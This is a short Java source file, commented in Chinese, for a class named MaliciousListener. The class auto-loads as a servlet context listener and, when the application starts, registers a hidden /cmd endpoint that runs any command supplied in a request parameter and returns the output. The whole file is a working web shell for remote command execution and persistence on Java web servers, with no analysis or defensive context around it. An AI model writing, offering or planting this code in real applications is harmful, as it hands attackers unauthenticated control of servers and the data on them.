
import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;

@WebListener // 自动加载
public class MaliciousListener implements ServletContextListener {

    @Override
    public void contextInitialized(ServletContextEvent sce) {
// 应用启动时注册一个命令执行的 Servlet
        sce.getServletContext().addServlet("cmdServlet", new HttpServlet() {
            @Override
            protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
                String cmd = request.getParameter("cmd");
                if (cmd != null && !cmd.isEmpty()) {
// 执行命令并回显结果
                    Process process = Runtime.getRuntime().exec(cmd);
                    InputStream inputStream = process.getInputStream();
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = inputStream.read(buffer)) != -1) {
                        response.getOutputStream().write(buffer, 0, bytesRead);
                    }
                    inputStream.close();
                } else {
                    response.getWriter().write("Usage: ?cmd=<command>");
                }
            }
        }).addMapping("/cmd"); // 将命令执行 Servlet 映射到 /cmd
    }

    @Override
    public void contextDestroyed(ServletContextEvent sce) {
// 应用关闭时清理资源（这里留空）
    }
}
